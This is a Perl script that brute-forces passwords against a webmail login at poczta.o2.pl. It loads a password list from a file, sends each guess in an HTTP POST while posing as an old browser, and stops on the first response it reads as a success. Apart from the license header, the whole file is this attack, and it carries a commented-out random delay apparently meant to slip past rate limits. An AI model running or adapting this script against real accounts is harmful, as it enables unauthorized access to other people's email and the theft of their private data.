#!/usr/local/bin/perl 
# 
# Copyright (c) 2010, Bartosz Jakoktochce, grypsy@gmail.com
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
# 1. Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
# 3. All advertising materials mentioning features or use of this software
#    must display the following acknowledgement:
#    This product includes software developed by the <organization>.
# 4. Neither the name of the <organization> nor the
#    names of its contributors may be used to endorse or promote products
#    derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY <COPYRIGHT HOLDER> ''AS IS'' AND ANY
# EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY
# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#
#
use strict;
use LWP::UserAgent;
require HTTP::Cookies;


my @agents = (
"Opera/9.21 (Windows; Windows NT 5.1; pl)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.8.1.3) Gecko/20070309 Firefox/1.5.10",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
);

my $ua = LWP::UserAgent->new();
$ua->agent($agents[2]);
$ua->timeout(30);

open PASS, 'lista.txt';
my @hasla = <PASS>;
close PASS;

my $cookie_jar;
$cookie_jar = HTTP::Cookies->new;
$cookie_jar->set_cookie(undef, "logcount", "2", "7");
$cookie_jar->set_cookie(undef, "ssl", "0", "1");

my $login = '';

foreach my $pass (@hasla) {
        chomp $pass;
        #next if ($pass =~ /^#/);
        print "trying: $pass";
        my %form = (
           'username' => $login,
           'password' => $pass,
           'ssl' => 'login',
           'forcens' => 'true'  
         );
         
        #sleep (150 + int(rand(50)));
        
        my $response = $ua->post('http://poczta.o2.pl/login.html', \%form);
        if ($response->is_error()) {
                print("connection error");
                next;
        }
        if ($response->content =~ "poczta.o2.pl") {
        		print (": GRANTED\n");
        		last; 
        } else {
        		print (": FAILED\n");
        		#my $t = $response->content;
        		#print "$t\n";
                #exit;
        }
}

